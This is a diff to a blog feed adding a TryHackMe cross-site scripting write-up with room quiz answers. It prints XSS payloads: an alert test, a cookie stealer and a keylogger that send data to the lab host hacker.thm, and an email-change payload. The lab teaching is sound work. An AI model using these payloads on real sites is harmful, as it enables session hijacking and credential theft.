@@ -12,6 +12,78 @@
     </author>
     
       <item>
+        <title>TryHackMe - Cross-Site Scripting (XSS)</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/xssgi&quot;&gt;https://tryhackme.com/room/xssgi&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Learn how to detect and exploit XSS vulnerabilities, giving you control of other visitor’s browsers.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-1-room-brief&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 1 Room Brief&lt;/h2&gt;
+
+&lt;p&gt;Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you’ll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.&lt;/p&gt;
+
+&lt;p&gt;Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;XSS found in Shopify&lt;/li&gt;
+  &lt;li&gt;$7,500 for XSS found in Steam chat&lt;/li&gt;
+  &lt;li&gt;$2,500 for XSS in HackerOne&lt;/li&gt;
+  &lt;li&gt;XSS found in Infogram&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What does XSS stand for? Cross-site Scripting&lt;/p&gt;
+
+&lt;h2 id=&quot;task-2-xss-payloads&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 2 XSS Payloads&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Proof Of Concept:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(&apos;XSS&apos;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Session Stealing:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Details of a user’s session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target’s cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker’s control to be logged. Once the hacker has these cookies, they can take over the target’s session and be logged as that user.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;fetch(&apos;https://hacker.thm/steal?cookie=&apos; + btoa(document.cookie));&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Key Logger:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker’s control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;document.onkeypress = function(e) { fetch(&apos;https://hacker.thm/log?key=&apos; + btoa(e.key) );}&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Business Logic:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user’s email address called user.changeEmail(). Your payload could look like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;user.changeEmail(&apos;attacker@hacker.thm&apos;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that the email address for the account has changed, the attacker may perform a reset password attack.&lt;/p&gt;
+
+&lt;p&gt;The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Which document property could contain the user’s session token?&lt;/p&gt;
+
+&lt;p&gt;Checking &lt;a href=&quot;https://www.w3schools.com/js/js_htmldom_document.asp&quot;&gt;https://www.w3schools.com/js/js_htmldom_document.asp&lt;/a&gt; we can see the list of document properties. document.cookie is what we’re looking for since this is for session tokens.&lt;/p&gt;
+
+&lt;p&gt;Which JavaScript method is often used as a Proof Of Concept?&lt;/p&gt;
+
+&lt;p&gt;From our first example “alert”. We can use &lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt; to see if we can xss.&lt;/p&gt;
+
+&lt;h2&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
+
+</description>
+        <pubDate>Sun, 12 Jun 2022 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000//TryHackMe-XSS</link>
+        <link href="http://localhost:4000/TryHackMe-XSS"/>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-XSS</guid>
+      </item>
+    
+      <item>
         <title>TryHackMe - Server-Side Request Forgery (SSRF)</title>
         <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/ssrfqi&quot;&gt;https://tryhackme.com/room/ssrfqi&lt;/a&gt;&lt;/p&gt;
 
